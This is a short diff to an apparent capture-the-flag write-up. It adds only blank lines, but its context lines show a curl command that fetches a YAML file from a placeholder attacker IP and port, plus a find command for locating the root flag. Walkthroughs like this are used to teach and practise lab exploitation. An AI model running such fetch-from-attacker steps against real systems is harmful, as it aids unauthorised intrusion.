@@ -89,4 +89,6 @@ then simply curl http://ATTACKER IP:PORT/file.yaml
 to get last flag use 
 ```find / -type f -name root.txt```
    
+   
+   
 
